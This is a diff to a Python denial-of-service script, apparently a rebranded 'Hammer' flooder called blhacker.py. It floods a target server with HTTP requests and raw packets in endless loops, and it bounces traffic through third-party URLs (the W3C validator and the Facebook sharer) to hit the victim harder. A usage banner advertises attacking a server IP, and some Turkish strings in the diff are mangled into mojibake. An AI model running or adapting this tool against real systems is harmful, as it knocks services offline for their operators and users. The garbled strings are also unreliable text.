@@ -21,8 +21,8 @@ def user_agent():
 def my_bots():
 	global bots
 	bots=[]
-	bots.append("T‹RK›YEM S›BER T›M")
-	bots.append("HACKED BY BLHACKER")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
 	return(bots)
 
 
@@ -30,7 +30,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is t¸rkiyem...\033[0m")
+			print("\033[94mbot is t√ºrkiyem...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -44,13 +44,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! T‹RK›YEM S›BER T›M--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! T√úRK√ùYEM S√ùBER T√ùM--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! sunucu d¸˛t¸\033[0m")
+		print("\033[91mno connection! sunucu d√º√æt√º\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -70,12 +70,12 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	BLHACKER T‹RK›YEM S›BER T›M
+	print (''' \033[92m	BLHACKER T√úRK√ùYEM S√ùBER T√ùM
 	usage : python3 blhacker.py [-s] [-p] [-t]
 	-y : YARDIM
 	-s : SUNUCU ip
 	-p :  PORT 80
-	-t : «OK HIZLI ATTACK NORMAL 150
+	-t : √áOK HIZLI ATTACK NORMAL 150
 	sys.exit()
 
 
@@ -85,11 +85,11 @@ def get_parameters():
 	global thr
 	global item
 	optp = OptionParser(add_help_option=False,epilog="Hammers")
-	optp.add_option("-Á","--Á˝k", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+	optp.add_option("-c","--c√Ωk", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
 	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 150 -t 150")
-	optp.add_option("-y","--yard˝m",dest="help",action='store_true',help="yard˝m edin")
+	optp.add_option("-y","--yard√Ωm",dest="help",action='store_true',help="yard√Ωm edin")
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
 	if opts.help:
@@ -123,7 +123,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[94mbekle biraz...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
